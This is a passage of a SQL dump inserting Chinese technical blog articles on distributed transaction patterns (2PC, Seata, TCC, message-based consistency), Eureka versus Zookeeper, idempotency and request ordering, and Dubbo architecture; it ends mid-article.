INSERT INTO `article` VALUES (60, 1, '分布式事务问题及解决方案', '2019/1/1546593152_67037CBC245AE4E31109E9F10CC508EA.jpg', '### 分布式事务\n![分布式事务产生原因.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623570780_分布式事务-产生原因.png)\n```java\n// 分布式事务产生原因\n1. 如果是在传统单点项目中,使用同一个数据源,数据用同一个事务管理器情况下,不会产生分布式事务问题\n2. 但在分布式中各服务间相互调用时,每个服务都有自己独立的数据源,每个服务使用自己本地的事务管理器,此时就会产生分布式事务问题\n\n// 分布式事务问题\n1. 调用方调用完其他服务接口后,突然程序抛出异常,调用方的事务回滚了,但是被调用方接口没有回滚\n\n@Override\npublic void updateAll() {\n	// 修改本地\n	payDao.update(); // 本地数据库事务可以回滚\n	// 远程调用\n	orderServiceFeign.update(); // 被调用的服务无法回滚,不在一台机器上,不在一个事务管理器中\n	int i = 1/0;// 报错了,需要回滚\n}\n\n// 分布式事务解决方案有哪些\n1. 2PC-XA\n2. 2PC-Seata\n3. TCC\n4. 最大努力通知\n5. 本地消息表\n6. 可靠消息最终一致性\n一般的同步依赖返回数据业务使用2PC-Seata\n一般的异步不依赖返回数据的业务使用可靠消息最终一致性\n核心重要的金钱业务无论是否依赖返回数据都使用TCC\n\n// 一些关于事务与分布式的基本知识\n// 什么是数据库事务\n1. 是指作为单个逻辑工作单元执行的一系列操作，要么完全地执行，要么完全地不执行。 事务处理可以确保除非事务性单元内的所有操作都成功完成，否则不会永久更新面向数据的资源。\n2. 事务是一种保证数据一致性的做法\n\n// ACID理论\n1. A 原子性: 要么全部执行,要求全部不执行,如果执行当中发生了错误,系统会回滚到最初的状态\n2. C 一致性: 数据库的执行不会改变数据库中数据的一致性\n3. I 隔离性: 两个以上的事务在执行过程中不会执行交错执行的状态,因为这样可能会导致数据的不一致\n4. D 持久性: 事务执行成功之后,该事务对于事务的更改持久的保持在数据库当中\n\n// CAP理论\n1. C 数据一致性: 数据一致\n2. A 服务可用性: 节点非故障情况下应该响应,不能一直等待(降级,终止)\n3. P 分区容错性: 某个节点发生故障也能满足数据一致性问题(可用,容错)\n只能保证AP或CP\n\n// BASE理论\n1. 最终一致性: 系统中所有数据副本经过一定时间后,最终能够达到一致的状态,不需要实时保证系统数据的一致性\n2. 基本可用 允许损失部分可用性,保证核心可用(降级)\n3. 软状态:允许系统不同节点同步过程中有中间状态存在耗时(MQ中体现)\n\n// 数据库事务问题\n脏读: 是指在一个事务处理过程里读取了另一个未提交的事务中的数据。当一个事务正在多次修改某个数据,而在这个事务中这多次的修改都还未提交，这时一个并发的事务来访问该数据，就会造成两个事务得到的数据不一致。\n不可重复读: 是指在对于数据库中的某个数据,一个事务范围内多次查询却返回了不同的数据值，这是由于在查询间隔,被另一个事务修改并提交了。\n虚读(幻读): 幻读是事务非独立执行时发生的一种现象。例如事务T1对一个表中所有的行的某个数据项做了从“1”修改为“2”的操作,这时事务T2又对这个表中插入了一行数据项,而这个数据项的数值还是为“1”并且提交给数据库。而操作事务T1的用户如果再查看刚刚修改的数据,会发现还有一行没有修改,其实这行是从事务T2中添加的,就好像产生幻觉一样,这就是发生了幻读\n注意幻读是在当前读的情况下才会出现的,快照读不会出现,幻读仅专指“新插入的行”\n\n// 事务隔离级别\n1. Serializable(串行化): 可避免脏读、不可重复读、幻读的发生。\n2. RepeatableRead(可重复读): 可避免脏读、不可重复读的发生。(Mysql默认)\n3. ReadCommitted(读已提交): 可避免脏读的发生。(Oracle,SqlServer默认)\n4. ReadUncommitted(读未提交): 最低级别,任何情况都无法保证\n\n// 事务的传播行为\n// 执行事务的service业务层调用另一个service业务层所采用的策略\n// Spring的事务传播策略\n1. ProPagation_required: 支持当前事务,如果不存在,就新建一个(默认)\n2. ProPagation_supports: 支持当前事务,如果不存在,就不使用使用\n3. ProPagation_mandatory: 支持当前事务,如果不存在,抛出异常\n4. ProPagation_requires_new: 如果有事务存在,挂起当前事务,创建一个新的事务\n5. ProPagation_not_supported: 以非事务方式运行,如果有事务存在,挂起当前事务\n6. ProPagation_never: 以非事务方式运行,如果有事务运行,抛出异常\n7. ProPagation_nested: 如果当前事务存在,则嵌套事务执行\n\n\n```\n### 2PC-XA\n![分布式事务2PCXA.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624203481_分布式事务-2PC-XA.png)\n```java\n// 2PC-XA方案\n1. XA方案是一种解决单个应用程序连接多个数据库时保证事务一致性的方案\n2. 各种数据库规范了一套DTP模型,基于数据库的XA协议来实现2PC又称为XA方案\n3. DTP模型定义TM和RM之间的通信接口规范叫XA,简单理解为数据库提供2PC接口协议\n\n// DTP模型\nAP: 应用程序,可以理解为使用DTP分布式事务的程序\nTM: 事务管理器,负责协调和管理事务,事务管理器控制着全局事务,管理事务生命周期,并协调各个RM\nRM: 资源管理器,可以理解为事务的参与者,一般情况下是指一个数据库实例,通过资源管理器对该数据库进行控制,资源管理器控制着分支事务\n全局事务是指分布式事务处理环境中,需要操作多个数据库共同完成一个工作,这个工作即是一个全局事务\n\n// 步骤\n1. 事务管理器通知各分支事务,开始执行事务\n2. 各本地分支事务开始启动事务,并执行业务逻辑,但是完成后不提交事务.逻辑处理完后,将自己需要提交或者回滚反馈给事务管理器,这是第一阶段,叫准备阶段\n3. 事务管理器得到所有本地分支事务的信息,根据结果不同,通知各本地事务执行提交或回滚,这是第二阶段,叫提交阶段\n	如果所有RM都正常成功可以提交,那么通知大家都提交吧,随后各本地事务开始真正提交事务\n	如果只要有一个RM失败不能提交,那么通知大家都回滚吧,随后各本地事务开始回滚事务\n\n// 两个阶段\n在准备阶段RM执行实际业务操作,但不提交事务,资源锁定\n在提交阶段TM会接受RM在准备阶段的执行回复,只要有任一个RM执行失败,TM会通知所有RM执行回滚操作,否则,TM将会通知所有RM提交该事务 提交阶段结束将资源锁释放\n\n// jta\n1. spring jpa是使用该xa方案的jar包\n1. jta是单应用多数据源的,但一般来说某个系统内部如果出现跨多个库的这么一个操作，是不合规的,每个服务只能操作自己对应的一个数据库\n2. 不允许直连别的服务的库，这违反微服务架构的规范，随便交叉胡乱访问，几百个服务的话，全体乱套，这样的一套服务是没法管理的，没法治理的，数据被别人改错，自己的库被别人写挂。\n3. 如果要操作别人的服务的库，必须是通过调用别的服务的接口来实现，绝对不允许交叉访问别人的数据库\n\n// XA方案的缺陷\n1. 需要本地数据库支持XA协议\n2. 因为准备阶段完成并不会提交事务,数据库资源锁需要等到两个阶段结束才会释放,并发情况下,会有大量事务堆积,性能差\n\n// 3PC\n3PC是2PC的改进版本,相比于2PC,它增加了一次Try阶段\nTry会让所有本地分支事务进行一次数据库调用尝试,确保数据库执行没有问题,后续两个阶段与2PC一致\n\n```\n### 2PC-Seata\n![分布式事务2PCSeata.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624205654_分布式事务-2PC-Seata.png)\n```java\n// 2PC-Seata\n1. seata是alibaba开源的分布式事务框架\n2. seata支持2PC与TCC模式,但是目前TCC模式不支持spring cloud这种常用微服务框架,所以用的一般都是它的2pc模式\n3. 不同于传统2PC方案,seata在准备阶段时就已经把事务提交了,所以不会造成大量事务堆积,相比传统2pc,性能较好\n4. seata的回滚方案是反向sql,如果需要回滚,那么就将之前准备阶段执行的sql全部反向执行,比如insert变为delete\n5. 因为要记录准备阶段的sql,所以seata需要进行磁盘写入日志并依赖数据库\n\n// seata的2pc模型\nTC: 事务协调器,它是独立的中间件,需要独立部署运行,它维护全局事务的运行状态,接收TM指令发起全局事务的提交与回滚,负责与RM通信协调各分支事务的提交或回滚\nTM: 事务管理器,TM需要嵌入应用程序中工作,它负责开启一个全局事务,并最终向TC发起全局提交或全局回滚的指令\nRM: 控制分支事务: 负责分支注册,状态汇报,并接收事务协调器TC的指令,驱动分支(本地)事务的提交和回滚\n\n// 步骤\n1. 服务A的TM向TC申请开启一个全局事务,全局事务创建成功并生成一个全局唯一的XID(XID表示这次全局事务的id,该id是唯一的)\n2. 服务A的RM向TC注册分支事务,\n3. 该分支事务在服务A执行新增逻辑(提交事务),向数据库表中插入数据,并将其纳入XID对应的全局事务的管辖\n4. 执行远程调用服务B时(XID在微服务调用链路的上下文中传播,比如说请求头),服务B的RM向TC注册分支事务\n5. 服务B的该分支事务执行增加的逻辑(提交事务),向数据库表中插入数据,,并将其纳入XID对应的全局事务的管辖,返回服务A\n6. 服务C与服务B操作相同\n6. 服务A所有的分支事务执行完毕\n7. 服务ATM向TC发起针对XID的全局提交或回滚决议\n8. TC调度XID下管辖的全部分支事务完成提交或回滚请求\n如果进行提交,则会直接完成,因为在准备阶段时,所有的分支服务就已经提交了事务\n如果进行回滚,Seata会找到该XID执行链路的sql记录,让各分支服务进行反向sql操作\n\n// seata注意事项\n1. seata是工作在读未提交的隔离级别,会造成脏读、幻读\n2. 虽然官方提供了全局锁来实现了写隔离与读隔离，但是这将使整个程序的性能大打折扣。\n\n// Seata实现2pc与传统2pc区别\n1. 传统2PC方案的RM实际上是在数据库层,RM本质上就是数据库自身,通过XA协议实现\n2. Seata的RM是以jar包的形式作为中间件层部署在应用程序\n3. 传统2PC无论是第二阶段的决议是commit还是rollback,事务性资源的锁都要保持到Phase2完成才会释放\n4. Seata的做法是在Phase1就将本地事务提交,这样就省去Phase2持锁的时间,整体提高效率,回滚通过记录的反向sql实现\n\n```\n\n### TCC\n![分布式事务TCCconfrim.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623659781_分布式事务-TCC-confrim.png)\n![分布式事务TCCcancel.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623659781_分布式事务-TCC-cancel.png)\n```java\n1. TCC的全程是：Try、Confirm、Cancel\n2. 这个其实是用到了补偿的概念，分为了三个阶段\n	(1) Try阶段：这个阶段说的是对各个服务的资源做检测以及对资源进行锁定或者预留\n	(2) Confirm阶段：这个阶段说的是在各个服务中执行实际的操作\n	(3) Cancel阶段：如果任何一个服务的业务方法执行出错，那么这里就需要进行补偿，就是执行已经执行成功的业务逻辑的回滚操作\n \n// 流程 \n1. 先Try一下，不要把业务逻辑完成，先试试看，看各个服务能不能基本正常运转，能不能先冻结需要的资源。\n2. 如果Try都ok，也就是说，底层的数据库、redis、elasticsearch、MQ都是写入数据正常的，并且你保留好了需要使用的一些资源（比如冻结了一部分库存）。\n3. 接着再执行各个服务的Confirm逻辑，基本上Confirm就可以很大概率保证一个分布式事务的完成了。\n4. 那如果Try阶段某个服务就失败了，比如说底层的数据库挂了，或者redis挂了，等等。\n5. 此时就自动执行各个服务的Cancel逻辑，把之前的Try逻辑都回滚，所有服务都不要执行任何设计的业务逻辑。保证大家要么一起成功，要么一起失败。\n\n// TCC分布式事务框架\n1. 如果要TCC分布式事务，必须引入一款TCC分布式事务框架，比如国内开源的ByteTCC、himly、tcc-transaction。\n2. 否则的话，感知各个阶段的执行情况以及推进执行下一个阶段的这些事情，自己手写实现太复杂了。\n3. TCC分布式事务框架主要作用是对各参与事务框架的阶段进行感知协调,调用各阶段的接口\n4. 在confirm或cancel阶段,接口失败时,tcc事务框架会不断重试该失败服务的接口,直至成功为止\n4. TCC事务框架会记录一些分布式事务的活动日志的，可以在磁盘上的日志文件里记录，也可以在数据库里记录。保存下来分布式事务运行的各个阶段和状态。\n\nTCC严重依赖于你自己写代码来回滚和补偿，会造成补偿代码巨大且复杂\nTCC适用于跟钱相关的，跟钱打交道的，支付、交易相关的场景用TCC，严格保证分布式事务要么全部成功，要么全部自动回滚\n严格保证资金的正确性，防止在资金上出现问题\n需要编写大量的业务逻辑，自己判断一个事务中的各个环节是否ok，不ok就执行补偿/回滚代码\n\n```\n### 最大努力通知\n![分布式事务最大努力通知.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623581109_分布式事务-最大努力通知.png)\n```java\n1. 系统A执行本地事务后,发送消息至MQ\n2. 最大努力通知服务会消费mq,然后将消息写入数据库中记录下来,或者不持久化直接放入个内存队列也可以，接着调用系统B的接口\n如果系统B执行成功就ok了\n如果系统B执行失败了，那么最大努力通知服务就定时尝试重新调用系统反复N次，最后还是不行就放弃,记录日志并将多次调用信息写入数据库\n\n可以一定程度上允许少数分布式事务失败,一般用在对分布式事务不严格的场景,比如说记录一下日志\n重要业务如资金方面不允许使用该方案\n\n```\n\n### 本地消息表\n![分布式事务本地消息表.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623576378_分布式事务-本地消息表.png)\n```java\n1. 系统A在自己本地一个事务里操作同时，插入一条数据到消息表\n2. 然后在zk创建这条唯一消息的node,监听这个的node\n3. 接着系统A将这个消息发送到MQ中去\n4. 系统B接收消息后,在一个事务里，往自己本地消息表里插入一条数据，同时执行其他的业务操作，如果这个消息已经被处理过了，因为唯一索引约束,那么此时这个事务会回滚，这样保证不会重复处理消息保证解决幂等性问题\n5. 系统B向zk的这个消息的node更新值,该值根据系统B是事务执行成功还是失败而定,使得系统A接收到通知\n6. 系统A接收到zk通知后,若系统B成功则将系统A的该条消息的确认状态改为确认成功\n\n如果B系统处理失败了，那么就不会更新系统A的消息表状态\n所以A系统会定时扫描自己的消息表，如果有没处理的消息，会再次发送到MQ中去，让B再次处理\n这个方案保证了最终一致性，哪怕B事务失败了，但是A会不断重发消息，直到B那边成功为止\n\n这个方案最大的问题在于严重依赖于数据库的消息表来管理事务,高并发场景会降低性能,扩展性不佳\n```\n### 可靠消息最终一致性\n![分布式事务可靠消息最终一致性.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623667307_分布式事务-可靠消息最终一致性.png)\n```java\n这是基于本地消息表方案的一种改造\n1. 系统A先发送一条待确认的消息给可靠消息服务,如果这个消息发送失败就取消操作别执行了\n2. 如果这个待确认消息发送成功,那么执行本地事务,根据本地事务成功与否来决定发送给可靠消息服务的是成功消息还是失败消息\n3. 可靠消息服务接收到系统A的成功/失败消息,来更新消息的最新状态,若失败则说明系统A本地事务执行失败了,那么不继续接下来的操作了\n4. 若是成功消息则向zk注册该消息的node,用来接收下来系统B的通知\n5. 将消息发送给mq,并由mq让消息被系统B消费,消费时注册该消息的幂等性问题,一般根据该消息中业务id检查状态来决定唯一性\n6. 系统B将自己执行成功或失败的结果更新至zk中\n7. 可靠消息感知到消息node的变化,根据结果来处理,如果成功,那么将该消息状态更改为已完成,那么说明流程成功\n\n可靠消息服务定时轮询检查所有长时间成功但未完成的消息,因为这说明系统B失败了或者说系统B长时间没有处理结束进行回应,是否长时间根据消息中的状态的更新时间来决定\n这时将消息重新发送至mq让系统B消费,重复重试过程直到系统B成功\n\n可靠消息服务还会定时轮询检查所有长时间待确认的消息,这说明系统A发送完待确认消息后就没有下一步回应了,究竟是成功还是失败我也不知道\n调用系统A接口,问你这个是不是本地事务处理失败了，所以这么久没发送确认成功或失败消息？你给我个答复\n一般来说这里你可以查下数据库看之前本地事务是否执行，如果回滚了，那么这里就发送失败消息给可靠消息服务吧\n检查本地事务执行是否成功是避免可能本地事务执行成功了，但是确认成功或失败消息发送失败了。\n\n// 如何查看数据库看之前本地事务是否执行\n1. 在发送待确认消息前,生成一个唯一的事务id\n2. 发送待确认消息时,把这个事务id连同业务数据一起包含在消息中发送\n3. 设计一张事务记录表，将业务表和事务记录表绑定在同一个本地事务中\n4. 如果本地事务成功时，事务记录中应当已经记录该次事务id的状态为已完成。\n5. 当可靠消息服务回查时，检查对应的事务id的状态是否是已完成，而不用关心具体的业务数据逻辑正确。\n\n这个方案里，如果系统B的事务失败了就用mq重新发送重试，自动不断重试直到成功，\n如果多次重试都不行，要么就是针对重要的资金类业务进行回滚，\n比如系统B本地回滚后，想办法通知系统A也回滚,比如用zk通知系统A；或者是记录日志发送报警由人工来手工回滚和补偿\n\n```\n### 可靠消息最终一致性-事务消息\n![分布式事务可靠消息最终一致性事务消息.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623667306_分布式事务-可靠消息最终一致性-事务消息.png)\n```java\n这是基于可靠消息最终一致性的一种改造\n依赖于消息队列的事务消息实现,比如RocketMQ就支持事务消息\n1. 系统A先发送一个prepared消息到mq，如果这个prepared消息发送失败那么就直接取消操作别执行了\n2. 如果这个消息发送成功过了，那么接着执行本地事务，如果成功就告诉mq发送确认消息，如果失败就告诉mq回滚消息\n3. 如果发送了确认消息，那么此时B系统会接收到确认消息，然后执行本地的事务\n\nmq会自动定时轮询所有prepared消息回调你的接口，问你这个消息是不是本地事务处理失败了，所以这么久没发送确认消息？那是继续重试还是回滚？\n一般来说这里你就可以查下数据库看之前本地事务是否执行，如果回滚了，那么这里也回滚吧。\n这是避免可能本地事务执行成功了，但是confirm消息发送失败了。\n\n// 如何查看数据库看之前本地事务是否执行\n1. 设计一张消息记录表，将业务表和消息记录表绑定在同一个本地事务中\n2. 如果本地事务成功时，消息记录表中应当已经记录该消息Id的状态为已完成。\n3. 检查时只需要检查对应的消息Id的状态是否是已完成，而不用关心具体的业务数据逻辑正确。\n\n// 如何查看数据库看之前本地事务是否执行\n1. 在发送prepared前,生成一个唯一的事务id\n2. 发送prepared时,把这个事务id连同业务数据一起包含在消息中发送\n3. 设计一张事务记录表，将业务表和事务记录表绑定在同一个本地事务中\n4. 如果本地事务成功时，事务记录中应当已经记录该次事务id的状态为已完成。\n5. 当RocketMq回查时，检查对应的事务id的状态是否是已完成，而不用关心具体的业务数据逻辑正确。\n\n这个方案里同传统的可靠消息最终一致性方案，如果系统B的事务失败了就用mq重新发送重试，自动不断重试直到成功，\n如果多次重试都不行，要么就是针对重要的资金类业务进行回滚，\n比如系统B本地回滚后，想办法通知系统A也回滚,比如用zk通知；或者是发送报警由人工来手工回滚和补偿\n\nrocketmq 3.2.6之前的版本，可以按照上面的思路做，但是之后的版本rocketmq把自动轮询查找prepared状态消息并回调的接口给砍了,不开源了\n\n```', 0, 0, 282, 0, 0, '2019-12-03 20:37:05', '2021-01-15 20:37:05', 0, 0);
INSERT INTO `article` VALUES (61, 1, 'Eureka与Zookeeper注册中心区别', '2019/10/1570959667_mmexport1570957680626.jpg', '### EureKa\n![注册中心Eureka.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624103691_注册中心-Eureka.png)\n```java\n// Eureka集群特点\n1. Spring Cloud作为服务框架的，一般服务注册中心会选择Eureka\n2. Eurek是peer点对点模式，部署集群，集群里每个机器的地位是平等的\n3. 各个服务都可以向任何一个Eureka实例服务注册和服务发现\n4. 集群里任何一个Euerka实例接收到写请求之后，会自动同步数据给其他所有的Eureka实例\n5. Eureka是先更新本实例后就返回成功这次写入,再去同步给其他EureKa实例数据,数据不是严格一致性的\n5. 因为Eureka是eureka模式且同步数据时不是严格的数据一致性，同步数据可能还没同步到所有的Eureka，结果自己就宕机死了\n6. 当该Eureka实例宕机后,注册的服务会尝试去其他Eureka实例中注册数据,集群中单个Eureka宕机不影响可用性,但是看到的就不是最新的数据了\n6. Eureka保证了CAP中的AP,即服务可用性和分区容错性,但不保证严格的数据一致性,数据传输中途宕机会导致数据丢失\n\n// 服务更新时效性\n1. Eureka默认的配置非常糟糕，因为依靠缓存定时检查更新服务注册表,所以服务发现感知要到几十秒，甚至分钟级别，上线一个新的服务实例，到其他服务可以发现他，极端情况下，可能要1分钟的时间\n2. Eureka默认隔60秒才去检查心跳，发现服务上一次心跳是在60秒之前，隔60秒去检查心跳，超过90秒没有心跳，才会认为这个服务死了，更新注册表后还要更新缓存，但是定义每30秒检查才会更新ReadOnly缓存，再加上其他服务每30秒的拉取注册表信息,其他服务才会来拉取最新的注册表\n3. 这会导致如果服务实例挂掉了,三分钟过去了,别的服务才感知到，这个速度是很难接收的\n\neureka，很难支撑大规模的服务实例\n每个eureka实例都要接受所有的请求的同步更新数据,还需要不间断的接收所有服务的心跳,导致性能低效\n\n```\n### Zookeeper\n![注册中心Zookeeper.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624103691_注册中心-Zookeeper.png)\n```java\n// Zookeeper集群特点\n1. Dubbo作为服务框架的，一般注册中心会选择zk\n2. Zk是分为Leader + Follower两种角色，每个机器的地位不是平等的\n3. 只有Leader可以负责写也就是服务注册，只有他可以把数据同步给Follower，读的时候leader/follower都可以读\n3. 只有一个leader节点会接收数据,然后同步写入其他节点,这个写入是保证数据一致性的,当所有节点数据同步后,才会返回成功这次写入成功\n4. 一旦leader挂了，要重新选举leader，这个过程里为了保证数据一致性，就牺牲了服务可用性，zk将会不可用一段时间直到leader选举完毕,确认数据同步一致，只有当一个leader选举好了，那么就可以继续写数据了\n5. zk保证了CAP中的CP,即数据一致性和分区容错性,但不保证服务可用性\n6. 实际上zookeeper因为zab协议的过半写机制并不是强一致性,也是最终一致性,不过zk的最终一致性非常的可靠,哪怕宕机数据也会最终一致\n\n// 服务更新的时效性\n4. zk,时效性好，当发生新服务注册或者服务删除或者宕机，一般秒级就能感知到\n\nzk,很难支撑大规模的服务实例\n主Master实例压力过大,频繁的服务上下线会不断同步数据至所有的Slave节点\n当服务上下线时，需要瞬间推送数据通知到所有的其他服务,一旦服务规模太大，到了几千个服务的时候，会导致网络带宽被大量占用\n\n```\n### 取长补短\n![注册中心支撑大量实例的注册中心集群.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624103691_注册中心-支撑大量实例的注册中心集群.png)\n```java\neureka：点对点,每台机器都是高并发请求，性能有瓶颈\nzookeeper：单个服务上下线，会全量通知其他服务，网络带宽被打满，有瓶颈\n\n对Eureka与Zk进行取长补短\n1. 集群拆分,将注册中心集群拆分多份,每份集群存储部分的服务\n2. 服务注册,每个服务只注册到被分配的那部分的注册中心集群中\n3. 服务发现,服务调用者只拉取需要调用的那个服务的注册中心的注册表数据\n4. 高可用,采用zk的模式,分为主从模式,由Master进行写入数据并同步数据给所属的Slave节点,当Master宕机则从Slave中重新选举出Master\n5. 数据同步过程要保证只有当所有所属Slave的数据都同步一致了,才确认此次服务写入更新操作成功,保证数据一致性\n\n分片存储服务注册表，横向扩容，每台机器均摊高并发请求，各个服务主动拉取，避免反向通知网卡被打满\n1. 避免Eureka的所有实例都需要接收所有服务的心跳,导致的性能低效\n2. 避免zk因为数据更新,通知所有服务导致的网络带宽大量占用\n\n```', 0, 0, 79, 0, 0, '2019-12-04 17:41:14', '2020-07-24 17:41:14', 0, 0);
INSERT INTO `article` VALUES (62, 1, '数据幂等性与请求顺序性', '2019/10/1570976054_mmexport1570975455479.jpg', '### 幂等性\n![数据幂等性问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623414564_数据幂等性问题.png)\n```java\n// 幂等性\n1. 所谓幂等性，就是说一个接口，多次发起同一个请求\n2. 这个接口必须保证结果是准确的,不能因为多次调用导致数据不一致\n3. 比如不能多扣款，不能多插入一条数据，不能将统计值多加了1。这就是幂等性。\n\n// 保证幂等性主要是三点\n1. 每个请求必须有一个唯一的标识，比如订单支付请求，肯定包含订单id，一个订单id最多支付一次\n2. 每次处理完请求之后，必须有一个记录标识这个请求处理过了\n3. 每次接收请求需要进行判断之前是否处理过的逻辑处理\n\n比如插入时,支付之前有这个订单的支付流水记录，而且支付流水采用订单id作为唯一索引或与其他字段组成联合唯一索引,如果重复插入,那么数据库会报错\n比如更新时,在mysql中记录个状态啥的,处理前handle=0,处理后handle=1,处理前检查一下之前记录的标识是否已经处理该订单的支付处理了,但是因为并发,依然会导致幂等性重入,所以需要乐观锁检查版本号\n\n// 保证幂等性方式\n1. 插入数据时使用唯一索引保证\n2. 更新数据时可以使用乐观锁保证,每次更新时比对读数据时的版本号与当前数据库数据的版本号是否一致,不过高并发情况下会频繁导致失败,需要自旋重试\n3. 做个拦截器,每次请求时,因为请求参数是逻辑上每次唯一的,不能重复,那么将此次请求参数进行拼接得出key使用setnx放入redis中,因为redis插入与更新是原子的,不会导致并发问题,后续请求同样setnx这个key,如果有值,说明这条请求是重复的\n\n这个不是技术问题，这个没有通用的一个方法，这个是结合业务来看应该如何保证幂等性的\n注意在保证幂等性的同时,需要避免并发重入的问题,避免重复请求同时进入,甚至同时越过代码检查\n注意在核心业务上,尤其是和钱打交道的代码中,一定要注意幂等性问题,否则会给用户多扣款或者说多还返用户多次支付积分,造成财务损失\n\n```\n### 请求顺序性\n![请求顺序性问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623414564_请求顺序性问题.png)\n![请求顺序性问题分布式锁.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623414564_请求顺序性问题-分布式锁.png)\n![请求顺序性问题hash路由加串行化队列.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623414564_请求顺序性问题-hash路由加串行化队列.png)\n```java\n// 分布式锁解决\n1. 使用分布式锁来保证请求顺序性\n不过这会导致大量时间浪费在锁竞争上,降低系统效率\n如果用户不需要依赖返回的数据结果,那么建议竞争分布锁等后续操作由异步执行,系统提前返回客户端信息\n\n// hash路由加串行化队列\n1. 由路由系统hash将请求路由到不同的系统上\n将相同的订单id路由到同一个机器的系统上\n系统A也需要hash路由,将相同的订单id路由到同一个内存串行化队列中依次执行\n2. 这种方案无法完全保证请求顺序性,路由系统将请求分发到系统时,可能会由于网络延迟等问题\n发送到系统时seq的顺序错乱了,导致进入串行化队列也无法保证顺序性,因为进入系统时就已经乱了\n不过这种几率很低,如果不是严格要求请求顺序性的系统,可以忽略该缺点\n3. 避免这个缺陷\n可以在请求进入系统时进行检查该订单id的seq是否全部在到齐,到齐后再统一同步发送至串行化队列中\n不过这影响性能以及需要临时存储seq到齐的内存\n\n一般来说，从业务逻辑上最好设计的这个系统不需要这种顺序性的保证\n因为一旦引入顺序性保障，会导致系统复杂度上升，而且会带来效率低下，热点数据压力过大等问题。\n\n```', 0, 0, 76, 0, 0, '2019-12-04 22:14:50', '2020-01-03 22:14:50', 0, 0);
INSERT INTO `article` VALUES (63, 1, 'Dubbo基本原理与概述', '2019/10/1571027152_mmexport1570368387400.jpg', '### 基本原理\n![Dubbo基本架构原理.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624085809_Dubbo-基本架构原理.png)\n![Dubbo底层网络通信.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624087238_Dubbo-底层网络通信.png)\n```java\n// dubbo工作原理\n// 十层组成\n1. service层，接口层，给服务提供者和消费者来实现的\n2. config层，配置层，主要是对dubbo进行各种配置的\n3. proxy层，服务代理层，透明生成客户端的stub和服务单的skeleton\n4. registry层，服务注册层，负责服务的注册与发现\n5. cluster层，集群层，封装多个服务提供者的路由以及负载均衡，将多个实例组合成一个服务\n6. monitor层，监控层，对rpc接口的调用次数和调用时间进行监控\n7. protocol层，远程调用层，封装rpc调用\n8. exchange层，信息交换层，封装请求响应模式，同步转异步\n9. transport层，网络传输层，抽象mina和netty为统一接口\n10. serialize层，数据序列化层\n\n// 消费者\n1. 注册中心：Registry\n2. 动态代理：Proxy\n3. 负载均衡：Cluster，负载均衡，故障转移\n4. 通信协议：Protocol，filter机制，http、rmi、dubbo等协议\n5. 信息交换：Exchange，Response\n6. 网络通信：Transport，netty、mina\n7. 序列化：封装好的请求如何序列化成二进制数组，通过netty/mina发送出去\n// 提供者\n1. 注册中心：Registry\n2. 反序列化：将二进制数组反序列化为封装好的请求数据\n3. 网络通信：Transport，基于netty/mina实现的Server\n4. 信息交换：Exchange，Response\n5. 通信协议：Protocol，filter机制\n6. 动态代理：Proxy\n\n// 基本流程\n1. provider向注册中心去注册\n2. consumer从注册中心订阅服务，注册中心会通知consumer注册好的服务\n3. consumer调用provider\n4. consumer和provider都异步的通知监控中心最新的这次操作\n\n注册中心挂了也可以继续通信,因为刚开始初始化的时候，消费者会将提供者的地址等信息拉取到本地缓存，所以注册中心挂了可以继续通信\n\ndubbo核心组件全部都是接口化，组件和组件之间的调用，必须全部是依托于接口，然后去动态找配置的实现类，如果没有配置就用它自己默认的\ndubbo提供一种基于spi的自定义实现组件的配置方式,开发者可以自己开发组件并配置组件，dubbo时运行时会使用自己开发的组件作为接口的实现类\n```\n### 通信协议\n```java\ndubbo支持不同的通信协议\n支持hessian、java二进制序列化、json、SOAP文本序列化多种序列化协议。但是hessian是其默认的序列化协议。\n1. dubbo协议\n	dubbo://192.168.0.1:20188\n	dubbo默认就是走dubbo协议的，单一长连接，NIO异步通信，基于hessian作为序列化协议\n	适用的场景就是：传输数据量很小（每次请求在100kb以内），但是并发量很高\n	为了要支持每天调用量达到上亿次的高并发场景，此时用长连接是最合适的，服务提供者跟每个服务消费者维持一个长连接就可以，可能一亿个请求总共就1000个长连接。然后后面直接基于长连接NIO异步通信，可以支撑高并发请求。\n2. rmi协议\n	走java二进制序列化，多个短连接，适合消费者和提供者数量差不多，适用于文件的传输，一般较少用\n3. hessian协议\n	走hessian序列化协议，多个短连接，适用于提供者数量比消费者数量还多，适用于文件的传输，一般较少用\n4. http协议\n	走json序列化\n5. webservice\n	走SOAP文本序列化\n	\n```\n### 负载均衡策略和集群容错策略\n```java\n// dubbo负载均衡策略\n1. random loadbalance\n	默认情况下，dubbo是random load\n	balance随机调用实现负载均衡，可以对provider不同实例设置不同的权重，会按照权重来负载均衡，权重越大分配流量越高，一般就用这个默认的就可以了。\n2. roundrobin loadbalance\n	这个默认就是均匀地将流量打到各个机器上去，但是如果各个机器的性能不一样，容易导致性能差的机器负载过高。所以此时需要调整权重，让性能差的机器承载权重小一些，流量少一些。\n3. leastactive loadbalance\n	这个就是自动感知一下，如果某个机器性能越差，那么接收的请求越少，越不活跃，此时就会给不活跃的性能差的机器更少的请求\n4. consistanthash loadbalance\n	一致性Hash算法，相同参数的请求一定分发到一个provider上去，provider挂掉的时候，会基于虚拟节点均匀分配剩余的流量，抖动不会太大。\n	如果你需要的不是随机负载均衡，是要一类请求都到一个节点，那就走这个一致性hash策略。\n\n// dubbo集群容错策略\n1. failover cluster模式\n	失败自动切换，自动重试其他机器，默认就是这个，常见于读操作\n2. failfast cluster模式\n	